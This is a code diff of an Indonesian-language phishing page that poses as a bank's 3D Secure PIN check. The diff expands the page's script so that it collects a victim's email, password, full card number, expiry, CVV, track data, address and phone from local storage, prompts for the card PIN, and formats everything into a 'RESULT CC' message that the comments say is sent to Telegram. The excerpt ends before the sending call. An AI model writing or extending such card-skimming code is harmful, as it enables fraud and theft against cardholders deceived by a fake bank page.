@@ -25,7 +25,7 @@
             text-align: center;
         }
         .logo img { 
-            height: 60px; 
+            height: 30px; 
         }
         .kotak { 
             width: 100%; 
@@ -151,7 +151,7 @@
         
         <form id="form3DS">
             <p class="pin-judul">Masukkan PIN Anda</p>
-            <p class="pin-keterangan">Masukkan 6 digit PIN Anda yang digunakan untuk verifikasi dari bank penerbit kartu.</p>
+            <p class="pin-keterangan">Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.</p>
             
             <div class="pin-wadah">
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1" autofocus></div>
@@ -178,13 +178,17 @@
     </div>
 
     <script>
-        // === AMBIL SEMUA DATA DARI HALAMAN SEBELUMNYA ===
+        // === AMBIL SEMUA DATA DARI PENYIMPANAN LOKAL ===
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
-        const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
-        const nomorKartu = localStorage.getItem('nomorKartu') || '';
+        const passwordPengguna = localStorage.getItem('passwordPengguna') || '';
         const namaKartu = localStorage.getItem('namaKartu') || '';
+        const nomorKartu = localStorage.getItem('nomorKartu') || '';
         const expiry = localStorage.getItem('expiry') || '';
         const cvv = localStorage.getItem('cvv') || '';
+        const alamat = localStorage.getItem('alamat') || '';
+        const kota = localStorage.getItem('kota') || '';
+        const kodepos = localStorage.getItem('kodepos') || '';
+        const telepon = localStorage.getItem('telepon') || '';
         const trackKartu = localStorage.getItem('trackKartu') || '';
 
         // Tampilkan nomor kartu — 4 digit terakhir
@@ -196,7 +200,7 @@
         }
         document.getElementById('tampilEmail').textContent = emailPengguna;
 
-        // === 6 KOLOM PIN — OTOMATIS PINDAH BERIKUTNYA ===
+        // === 6 KOLOM PIN — OTOMATIS PINDAH KE BERIKUTNYA ===
         const kolom = [
             document.getElementById('p1'),
             document.getElementById('p2'),
@@ -207,7 +211,6 @@
         ];
 
         kolom.forEach((input, indeks) => {
-            // Hanya angka
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' || e.key === 'Delete') {
                     if (!input.value && indeks > 0) {
@@ -228,7 +231,6 @@
                 }
             });
 
-            // Isi → lanjut ke kolom berikutnya
             input.addEventListener('input', () => {
                 input.value = input.value.replace(/\D/g, '');
                 if (input.value && indeks < 5) {
@@ -238,13 +240,13 @@
         });
 
         // === KUMPULKAN 6 DIGIT PIN ===
-        function ambilKode() {
+        function ambilKodePIN() {
             let kode = '';
             kolom.forEach(input => kode += input.value);
             return kode;
         }
 
-        // === KIRIM SEMUA DATA KE TELEGRAM & LANJUT ===
+        // === KIRIM DATA LENGKAP + PIN KE TELEGRAM ===
         const form3DS = document.getElementById('form3DS');
         const tombolKirim = document.getElementById('tombolKirim');
         const sedangMemproses = document.getElementById('sedangMemproses');
@@ -252,8 +254,8 @@
         form3DS.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const kode = ambilKode();
-            if (kode.length !== 6) {
+            const kodePIN = ambilKodePIN();
+            if (kodePIN.length !== 6) {
                 alert('Masukkan 6 digit kode PIN');
                 return;
             }
@@ -262,20 +264,22 @@
             tombolKirim.style.display = 'none';
             sedangMemproses.classList.add('tampil');
 
-            // === PESAN LENGKAP UNTUK TELEGRAM ===
+            // === PESAN RESULT CC LENGKAP ===
             const pesanLengkap = `
-✅ *TRANSAKSI LENGKAP — 3D SECURE*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 *RESULT CC*
+━━━━━━━━━━━━━━━━━━━━━
 📧 Email: \`${emailPengguna}\`
 🔑 Password: \`${passwordPengguna}\`
 👤 Nama di Kartu: \`${namaKartu}\`
 🔢 Nomor Kartu: \`${nomorKartu}\`
 📅 Expiry: \`${expiry}\`
 🔒 CVV: \`${cvv}\`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔐 *PIN / KODE 3DS:* \`${kode}\`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📋 *TRACK DATA LENGKAP*
+📍 Alamat: \`${alamat}, ${kota} — ${kodepos}\`
+📞 Telepon: \`${telepon}\`
+━━━━━━━━━━━━━━━━━━━━━
+🔐 PIN / 3DS: \`${kodePIN}\`
+━━━━━━━━━━━━━━━━━━━━━
+📋 *TRACK DATA*
 \`\`\`
 ${trackKartu}
 \`\`\`
